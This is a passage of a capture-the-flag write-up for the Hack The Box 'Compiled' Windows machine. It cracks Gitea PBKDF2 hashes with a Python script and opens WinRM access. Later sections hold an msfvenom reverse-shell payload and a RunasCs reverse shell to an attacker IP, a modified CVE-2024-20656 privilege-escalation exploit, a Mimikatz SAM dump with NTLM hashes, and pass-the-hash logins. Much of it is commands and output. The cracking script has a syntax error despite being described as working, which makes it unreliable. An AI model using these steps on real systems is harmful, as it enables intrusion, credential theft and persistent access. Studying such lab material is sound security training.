With the Gitea database copied down we can inspect it with the SQLite 3 client. Which will allow us to completely read all aspects of the database. This includes the user authentication information used for the Gitea system. There are two users that draw our interest. The Richard user is of interest as Richard may be re-using their password and therefore we want to try to crack it so we can authenticate to the server normally. Additionally the Emily user was not originally seen in the web UI. Emily is also a user on the Windows box, so we will want to try to recover credentials for this user as well for much the same reason.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ sqlite3 gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
access                     org_user                 
access_token               package                  
action                     package_blob             
action_artifact            package_blob_upload      
action_run                 package_cleanup_rule     
action_run_index           package_file             
action_run_job             package_property         
action_runner              package_version          
action_runner_token        project                  
action_schedule            project_board            
action_schedule_spec       project_issue            
action_task                protected_branch         
action_task_output         protected_tag            
action_task_step           public_key               
action_tasks_version       pull_auto_merge          
action_variable            pull_request             
app_state                  push_mirror              
attachment                 reaction                 
badge                      release                  
branch                     renamed_branch           
collaboration              repo_archiver            
comment                    repo_indexer_status      
commit_status              repo_redirect            
commit_status_index        repo_topic               
dbfs_data                  repo_transfer            
dbfs_meta                  repo_unit                
deploy_key                 repository               
email_address              review                   
email_hash                 review_state             
external_login_user        secret                   
follow                     session                  
gpg_key                    star                     
gpg_key_import             stopwatch                
hook_task                  system_setting           
issue                      task                     
issue_assignees            team                     
issue_content_history      team_invite              
issue_dependency           team_repo                
issue_index                team_unit                
issue_label                team_user                
issue_user                 topic                    
issue_watch                tracked_time             
label                      two_factor               
language_stat              upload                   
lfs_lock                   user                     
lfs_meta_object            user_badge               
login_source               user_open_id             
milestone                  user_redirect            
mirror                     user_setting             
notice                     version                  
notification               watch                    
oauth2_application         webauthn_credential      
oauth2_authorization_code  webhook                  
oauth2_grant             
sqlite> select * from user;
1|administrator|administrator||administrator@compiled.htb|0|enabled|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|pbkdf2$50000$50|0|0|0||0|||6e1a6f3adbe7eab92978627431fd2984|a45c43d36dce3076158b19c2c696ef7b|en-US||1716401383|1716669640|1716669640|0|-1|1|1|0|0|0|1|0||administrator@compiled.htb|0|0|0|0|0|0|0|0|0||arc-green|0
2|richard|richard||richard@compiled.htb|0|enabled|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|pbkdf2$50000$50|0|0|0||0|||2be54ff86f147c6cb9b55c8061d82d03|d7cf2c96277dd16d95ed5c33bb524b62|en-US||1716401466|1720089561|1720089548|0|-1|1|0|0|0|0|1|0||richard@compiled.htb|0|0|0|0|2|0|0|0|0||arc-green|0
4|emily|emily||emily@compiled.htb|0|enabled|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|pbkdf2$50000$50|1|0|0||0|||0056552f6f2df0015762a4419b0748de|227d873cca89103cd83a976bdac52486|||1716565398|1716567763|0|0|-1|1|0|0|0|0|1|0||emily@compiled.htb|0|0|0|0|0|0|0|2|0||arc-green|0
6|thadigus|thadigus||thadigus@compiled.htb|0|enabled|4570eecf621c528d2ab485f255e619c15edc47085feea0863e177e00796b90791b3a6e2774c76903ed984af7b74da5b79184|pbkdf2$50000$50|0|0|0||0|||cf80a9e9206993b616b48aa2f435431d|aab3284c545bbe0c2e3d97b5b8e167db|en-US||1733003144|1733024139|1733004459|0|-1|1|0|0|0|0|1|0||thadigus@compiled.htb|0|0|0|0|2|0|0|0|0|unified|arc-green|0
```

If we look at the [Gitea documentation](https://docs.gitea.com/administration/config-cheat-sheet) we can find that this password hash format is using [PBKDF2-HMAC-SHA256](https://gitlab.minie4.de/minie4/gitea-hidden-repos/-/blob/hidden-repos/modules/auth/password/hash/setting.go). We know that the default pseudorandom function is [HMAC](https://en.wikipedia.org/wiki/PBKDF2). 

```shell
sqlite> select name,passwd_hash_algo,passwd,salt from user;
administrator|pbkdf2$50000$50|1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d|a45c43d36dce3076158b19c2c696ef7b
richard|pbkdf2$50000$50|4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e|d7cf2c96277dd16d95ed5c33bb524b62
emily|pbkdf2$50000$50|97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16|227d873cca89103cd83a976bdac52486
thadigus|pbkdf2$50000$50|4570eecf621c528d2ab485f255e619c15edc47085feea0863e177e00796b90791b3a6e2774c76903ed984af7b74da5b79184|aab3284c545bbe0c2e3d97b5b8e167db
```

Looking at the hash format portion we can see that 50000 rounds were used to generate the hash, but the 50 number behind it is hard to determine meaning from. I spent hours trying to get these hashes formatted in a way that Hashcat would be able to use but I simply couldn't get anything to work (having done the entirety of rockyou.txt multiple times) over the course of hours. 

I eventually fed the above code block into ChatGPT and asked it to format them in a way that Hashcat would understand. It failed to do this multiple times and I eventually just asked it to write a Python script to crack these hashes. I do not quite understand the code below well enough to explain why it works, but Hashcat wouldn't have, but it was able to crack the hashes. Note that it cracks them sequentially, starting with Administrator, so you might want to remove users you don't care about. 

This was a very frustrating step for me because I don't feel like I quite understand why it worked. I would advise that you make sure you're using the same parameters that we found in the source code previously, as these were parameters I had to edit and mess with in ChatGPT's code.

- SHA256
- HMAC
- 50000 iterations
- 50 bit key length

```python
import hashlib
import binascii

# List of users with their PBKDF2 hashes, salts, and iterations
user_data = [
    {
        "username": "administrator",
        "iterations": 50000,
        "salt": "a45c43d36dce3076158b19c2c696ef7b",
        "hash": "1bf0a9561cf076c5fc0d76e140788a91b5281609c384791839fd6e9996d3bbf5c91b8eee6bd5081e42085ed0be779c2ef86d"
    },
    {
        "username": "richard",
        "iterations": 50000,
        "salt": "d7cf2c96277dd16d95ed5c33bb524b62",
        "hash": "4b4b53766fe946e7e291b106fcd6f4962934116ec9ac78a99b3bf6b06cf8568aaedd267ec02b39aeb244d83fb8b89c243b5e"
    },
    {
        "username": "emily",
        "iterations": 50000,
        "salt": "227d873cca89103cd83a976bdac52486",
        "hash": "97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16"
    },
    {
        "username": "thadigus",
        "iterations": 50000,
        "salt": "aab3284c545bbe0c2e3d97b5b8e167db",
        "hash": "4570eecf621c528d2ab485f255e619c15edc47085feea0863e177e00796b90791b3a6e2774c76903ed984af7b74da5b79184"
    }
]

# Function to check if a password matches the PBKDF2 hash
def check_password(password, salt, iterations, expected_hash):
    """Check if a password matches the PBKDF2 hash using HMAC-SHA256."""
    # Generate the hash for the given password
    generated_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), binascii.unhexlify(salt), iterations, dklen=50)
    # Compare the generated hash to the expected hash
    return generated_hash.hex() == expected_hash

# Function to crack passwords
def crack_passwords():
    # Specify the path to your wordlist file (e.g., 'rockyou.txt')
    wordlist_path = "rockyou_utf_8.txt"  # Change this to the correct path to your wordlist file
    found_passwords = {}

    # Read the wordlist
    with open(wordlist_path, 'r') as wordlist:
        words = wordlist.readlines()
    
    # Strip newlines from each word in the wordlist
    words = [word.strip() for word in words]

    # Try each password guess for each user
    for user in user_data:
        print(f"Cracking password for {user['username']}...")
        for password in words:
            if check_password(password, user['salt'], user['iterations'], user['hash']):
                print(f"Password found for {user['username']}: {password}")
                found_passwords[user['username') = password
                break  # Stop once the password is found

    return found_passwords

if __name__ == "__main__":
    # Call the crack_passwords function to start cracking
    found_passwords = crack_passwords()

    # Output the results
    if found_passwords:
        print("\nCracked passwords:")
        for username, password in found_passwords.items():
            print(f"{username}: {password}")
    else:
        print("No passwords were cracked.")
```

Here is the output we recieved when we ran the script on my main machine, which has a much faster processor for these types of workloads:

```shell
λ archwhitebox Compiled → nvim chatgpt.py 
λ archwhitebox Compiled → python3 chatgpt.py 
Cracking password for emily...
Password found for emily: 12345678
Cracking password for thadigus...
```

With this, we have the password for the Emily user, and we can use Evil-WinRM to access the machine and get our user flag:

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ evil-winrm -i 10.10.11.26 -u emily -p '12345678'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Emily\Documents> whoami
compiled\emily
*Evil-WinRM* PS C:\Users\Emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Emily\Desktop> ls


    Directory: C:\Users\Emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/30/2024   8:52 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Emily\Desktop> type user.txt
6136ce1209ed1fbf87efe73b79a3dfc6
*Evil-WinRM* PS C:\Users\Emily\Desktop> 
```

### Privilege Escalation to Root

I've read on the forum that using Evil-WinRM makes the privilege escalation impossible, so I was sure to use the PowerShell #3 (Base64) reverse shell from the online reverse shell generator located at <https://www.revshells.com/>. I also utilized an `rlwrap nc -nlvp 4444` shell handler in order to get a reverse shell as Emily with the most compatibility possible.

The only notable piece of software installed on the box that we learn about from the user shell access would be the installation of Visual Studio. It appears that this is the platform they are using to build their C++ and C# applications. We can use the `vswhere.exe` command line utility to enumerate version information and research exploitation possibilities.

```shell
C:\Program Files\RUXIM>"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
Visual Studio Locator version 3.1.1+f4ef329670 [query version 2.7.3111.17308]
Copyright (C) Microsoft Corporation. All rights reserved.

instanceId: 84a1ffb2
installDate: 1/20/2024 1:44:44 AM
installationName: VisualStudio/16.10.0+31321.278
installationPath: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
installationVersion: 16.10.31321.278
productId: Microsoft.VisualStudio.Product.Community
productPath: C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\devenv.exe
state: 4294967295
isComplete: 1
isLaunchable: 1
isPrerelease: 0
isRebootRequired: 0
displayName: Visual Studio Community 2019
description: Powerful IDE, free for students, open-source contributors, and individuals
channelId: VisualStudio.16.Release
channelUri: https://aka.ms/vs/16/release/channel
enginePath: C:\Program Files (x86)\Microsoft Visual Studio\Installer\resources\app\ServiceHub\Services\Microsoft.VisualStudio.Setup.Service
installedChannelId: VisualStudio.16.Release
installedChannelUri: https://aka.ms/vs/16/release/channel
releaseNotes: https://docs.microsoft.com/en-us/visualstudio/releases/2019/release-notes-v16.10#16.10.0
thirdPartyNotices: https://go.microsoft.com/fwlink/?LinkId=660909
updateDate: 2024-01-20T00:44:44.5974821Z
catalog_buildBranch: d16.10
catalog_buildVersion: 16.10.31321.278
catalog_id: VisualStudio/16.10.0+31321.278
catalog_localBuild: build-lab
catalog_manifestName: VisualStudio
catalog_manifestType: installer
catalog_productDisplayVersion: 16.10.0
catalog_productLine: Dev16
catalog_productLineVersion: 2019
catalog_productMilestone: RTW
catalog_productMilestoneIsPreRelease: False
catalog_productName: Visual Studio
catalog_productPatchVersion: 0
catalog_productPreReleaseMilestoneSuffix: 5.0
catalog_productSemanticVersion: 16.10.0+31321.278
catalog_requiredEngineVersion: 2.10.2174.31177
properties_campaignId: 
properties_channelManifestId: VisualStudio.16.Release/16.10.0+31321.278
properties_nickname: 2
properties_setupEngineFilePath: C:\Program Files (x86)\Microsoft Visual Studio\Installer\setup.exe
```

There are a handful of reported vulnerabilities for privilege escalation in this version of Visual Studio per the CVE Details website: <https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-54768/version_id-1224951/year-2024/opgpriv-1/Microsoft-Visual-Studio-2019-16.10.0.html>. It looks like CVE-2024-20656 is our ticket. 

One of the escalation vulnerabilities is for the installer process, and CVE-2024-29060 is only a medium vulnerability with high complexity and a network attack vector. CVE-2024-20656, on the other hand, is a low complexity local attack that is rated as a high vulnerability. Given the ratings and classifications, we can reasonably assume that the later vulnerability will yield the best resolts.

A PoC project has been created for a 64 bit installation of Visual Studio 2022 https://github.com/Wh04m1001/CVE-2024-20656 that we can use with slight modifications for our 32-bit 2019 installation on the target machine. This will essentially automate the process of abusing the file handling of the VSStandardCollectorService150 Service. Full details of this exploit can be explored in this article: <https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/>. It's quite a complicated exploit but at a very high level, we will be dropping a malicious executable reverse shell on the file system and then utilize this exploit automation to pick it up and replace the `MofCompiler.exe` binary with our malicious executable through a series of file permission overwrites with a few tricks. While I don't understand this exploit entirely I was able to make a few modifications to get it to run with our version.

#### Exploit Modification

Both modifications are in the `main.cpp` file to adjust the location of the `VSDiagnostics.exe` utility for our 32-bit Visual Studio 2019 installation and the copy command that is going to replace the `MofCompiler.exe` binary with our malicious reverse shell executable. The first modification is at the top of the file on line 4: `WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";`. 

The second modification is on line 187 where we specify the file copy procedure: `CopyFile(L"C:\\Users\\Public\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);`.

Once these modifications are made we need to compile the executable on a disposable Windows VM and then transfer it to the target machine. Users on the forum have also noted that you need to make sure you select the Release build rather than the Debug mode.

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241202023238.png)

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241202023206.png)

Another handy lab tip you can use is the fact that the Impacket SMB Server script works for regular Windows machines as well. So we were able to easily transfer the comiled binary to the Kali attack machine with ease through the use of the SMB server just like exfiltrating the Gitea database earlier. Steps are shown below:

`/usr/share/doc/python3-impacket/examples/smbserver.py test ./ -smb2support`

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241202023856.png)

#### Exploitation - Privilege Escalation

We will need two utilities to get a successful reverse shell on the machine with this exploit. The first is a simple non-staged reverse shell that will generate our malicious executable to be ran with root permissions as a result of our exploit. This can be generated with the following command: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o reverse.exe` (this command can be generated from <https://www.revshells.com/> as well). Be sure to upload the reverse shell to `C:\Users\Public\reverse.exe` so that it is in an easy to access, and universally accessible location on the target machine.

The second utility is a replacement for the RunAs command on Windows that allows us to supply a password at the command line. By default the RunAs utility does not accept credentials on the command for security reasons. It appears that Microsoft does not want us to use the utility like `sudo` for Windows, but [Antonio on GitHub](https://github.com/antonioCoco) has created a great open source version that will accept the credentials. This will allow us to run these commands in a more stable environment than our simple reverse shell, or even worse, in Win-RM. Without this utility, the commands don't want to run very easily.

<https://github.com/antonioCoco/RunasCs>

Now that we have uploaded the following:
- `expl.exe`
- `reverse.exe`
- `RunasCs.exe`

Created our reverse shell handler: `rlwrap nc -nlvp 4444`

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241202024757.png)

![Screenshot](/assets/images/2025-01-17-Compiled-HTB-Writeup/Compiled-Writeup-HTB20241202024958.png)

We can now run the exploit with two shells. First start an Evil-WinRM session and then use RunasCs to send a reverse shell over to our attacking machine:

```shell
./RunasCs.exe Emily 12345678 powershell.exe -r 10.10.14.6:4444
```

Then, start another reverse shell handler to catch the second root shell we will be delivering shortly with `rlwrap nc -nlvp 4444`. 

We are now ready to execute the reverse shell privilege escalation exploit. We can use our just created reverse shell to start the service.

```shell
net start msiservice
```

Then immediately run the Expl.exe binary in the previous Evil-WinRM shell.

```shell
./RunasCs.exe Emily 12345678 "C:\Users\Emily\Downloads\Expl.exe"
```

```shell
*Evil-WinRM* PS C:\Users\Emily\Downloads> ./RunasCs.exe Emily 12345678 "C:\Users\Emily\Downloads\Expl.exe"

[+] Junction \\?\C:\60d0e959-c959-4bec-bbf4-9a8516d523d9 -> \??\C:\fd384ce2-b15a-4a91-906a-66d8ff4b61ad created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\60d0e959-c959-4bec-bbf4-9a8516d523d9 -> \RPC Control created!
[+] Junction \\?\C:\60d0e959-c959-4bec-bbf4-9a8516d523d9 -> \??\C:\fd384ce2-b15a-4a91-906a-66d8ff4b61ad created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\60d0e959-c959-4bec-bbf4-9a8516d523d9 -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!
*Evil-WinRM* PS C:\Users\Emily\Downloads> 
```

Then we will receive a revere shell as the Administrator user on the machine in our second handler. At this point we have rooted the machine and we have full administrative rights over it.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.26] 64983
Microsoft Windows [Versi�n 10.0.19045.4651]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\ProgramData\Microsoft\VisualStudio\SetupWMI>whoami
whoami
nt authority\system

C:\ProgramData\Microsoft\VisualStudio\SetupWMI>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 352B-98C6

 Directorio de C:\Users\Administrator\Desktop

07/15/2024  10:49 AM    <DIR>          .
07/15/2024  10:49 AM    <DIR>          ..
11/30/2024  08:52 PM                34 root.txt
               1 archivos             34 bytes
               2 dirs  10,059,243,520 bytes libres

C:\Users\Administrator\Desktop>type root.txt
type root.txt
786a05863c5400a0c34fe41f8e245b5d

C:\Users\Administrator\Desktop>
```

## Additional Exploitation

If we really wanted to we can dump LSA with our administrative rights in order to get the password hash of the Administrative user. Retrieving a password hash like this is a much easier method to retain access. As long as the password is not changed (which is typically rare in most environments) we can reliably log in with just the password hash via WinRM for the foreseeable future. This is way easier than going through the whole expoitation process each time.

We can start this process by uploading Mimikatz through our current WinRM session with the Emily user. After this we will execute `mimikatz.exe`. This will require that anti-virus is temporarily disabled as well since Mimikatz has a very recognizable signature. Windows Defender must be disabled, but it was already disabled on this machine, which is fairly common for medium level difficulty machines.

```shell
*Evil-WinRM* PS C:\Users\Emily\Downloads> upload /home/kali/Hacking/HTB/Compiled/mimikatz.exe
                                        
Info: Uploading /home/kali/Hacking/HTB/Compiled/mimikatz.exe to C:\Users\Emily\Downloads\mimikatz.exe
                                        
Data: 1666740 bytes of 1666740 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Emily\Downloads> 
```

One Mimikatz is executed we will be met with the standard prompt. From here we can simply load and run `lsadump::sam` to dump the entire SAM database to the screen. All credentials should be immediately copied to the attack machine by hand so that we can use them later. Most importantly, we need to recover the NTLM hash for the Administrator user.

```shell
C:\Users\Administrator\Desktop>cd C:\Users\Emily\Downloads
cd C:\Users\Emily\Downloads                                                                                         
                                                                                                                    
C:\Users\Emily\Downloads>dir
dir                                                                                                                 
 El volumen de la unidad C no tiene etiqueta.                                                                       
 El n�mero de serie del volumen es: 352B-98C6                                                                       
                                                                                                                    
 Directorio de C:\Users\Emily\Downloads                                                                             
                                                                                                                    
12/02/2024  08:53 AM    <DIR>          .                                                                            
12/02/2024  08:53 AM    <DIR>          ..                                                                           
12/02/2024  08:46 AM           167,936 Expl.exe                                                                     
12/02/2024  08:53 AM         1,250,056 mimikatz.exe                                                                 
12/02/2024  08:47 AM             7,168 reverse.exe                                                                  
12/02/2024  08:46 AM            51,712 RunasCs.exe                                                                  
               4 archivos      1,476,872 bytes                                                                      
               2 dirs  10,057,998,336 bytes libres                                                                  
                                                                                                                    
C:\Users\Emily\Downloads>mimikatz.exe
mimikatz.exe                                                                                                        
                                                                                                                    
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36                                                        
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                         
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                            
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                              
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                           
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                
mimikatz # lsadump::sam
Domain : COMPILED
SysKey : ef9684d8a57e7877b9db904fe9bb3f87
Local SID : S-1-5-21-4093338461-994521390-3704224775

SAMKey : 565c2b9d0fa08697947f0ec82936a0b6

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: f75c95bc9312632edec46b607938061e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a8bdb4de233fcc523de7c295b60aa630

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-R3UQMMNAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 7a46bc71c88814b77b54e2fea7028627b2dec86fd436880ced2c3f68b128e5f3
      aes128_hmac       (4096) : 904b3f567dd64033cab936670abee6d2
      des_cbc_md5       (4096) : 89aef29b2f52e5ab

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-R3UQMMNAdministrator
    Credentials
      des_cbc_md5       : 89aef29b2f52e5ab


RID  : 000001f5 (501)
User : Invitado

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: ac8352a8680463c78247b75a023999cc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 3569d5e4165ccf6c8066d4c98cd47a4c

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d3f4619d50309b281e0af3859e8bd0de75b3a839d2f4289a5ab00757f3e39baf
      aes128_hmac       (4096) : d5c3fbaf968f31fda4c124b9e33f079b
      des_cbc_md5       (4096) : 2a769d20a1382f1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 2a769d20a1382f1f


RID  : 000003e9 (1001)
User : Emily
  Hash NTLM: 259745cb123a52aa2e693aaacca2db52

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 56146bf0ea07641a2cb64c41a068f7c7

* Primary:Kerberos-Newer-Keys *
    Default Salt : COMPILEDEmily
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 2059000111e52df43201309b5cb744d0849aa8237877373e82784d510713591c
      aes128_hmac       (4096) : 1c225df0e8cb5fb0fd43eb31df913ff9
      des_cbc_md5       (4096) : 1f15a2a78c34260b
    OldCredentials
      aes256_hmac       (4096) : 069c47ebd45f1ce462cf62fb1a5a672bb25dd8b0cd1e06c9f9eb120cde444716
      aes128_hmac       (4096) : 8f92e5fd510ae35c043ea61e959b7506
      des_cbc_md5       (4096) : 80cdc1fe7ac24307
    OlderCredentials
      aes256_hmac       (4096) : 133fc63dfa50701e924171356cbb4ad1cd8674414b5a92f373915e74ca411938
      aes128_hmac       (4096) : 43a8e9710a1ad97dbdb07c500b186a79
      des_cbc_md5       (4096) : 02d59445e9165e52

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : COMPILEDEmily
    Credentials
      des_cbc_md5       : 1f15a2a78c34260b
    OldCredentials
      des_cbc_md5       : 80cdc1fe7ac24307


RID  : 000003ea (1002)
User : Richard
  Hash NTLM: f21635b4c33e9ed3ee47dd5b31ff0f92

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d9810e30b14cf2a3db102859fc719ec1

* Primary:Kerberos-Newer-Keys *
    Default Salt : DESKTOP-R3UQMMNRichard
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c16ad800abbf8d777814d4a44824985c8ee0e236b8128a21eb064869a2c141bd
      aes128_hmac       (4096) : ab8ac67135b2bf4e034b80f2bb5212b8
      des_cbc_md5       (4096) : 525e3db9adb0b358

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : DESKTOP-R3UQMMNRichard
    Credentials
      des_cbc_md5       : 525e3db9adb0b358


mimikatz # 
```

### Persistent Shell with Administrator User

Lastly, we can use the recovered NTLM hash to start a WinRM session with the machine by using the 'pass-the-hash' functionality of Evil-WinRM. This will easily create a WinRM session as if we supplied a clear text password instead. From here we can retain our administrative access to the machine and use it to pivot and dive deeper into the target network.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Compiled]
└─$ evil-winrm -i 10.10.11.26 -u Administrator -H 'f75c95bc9312632edec46b607938061e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/30/2024   8:52 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
786a05863c5400a0c34fe41f8e245b5d
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
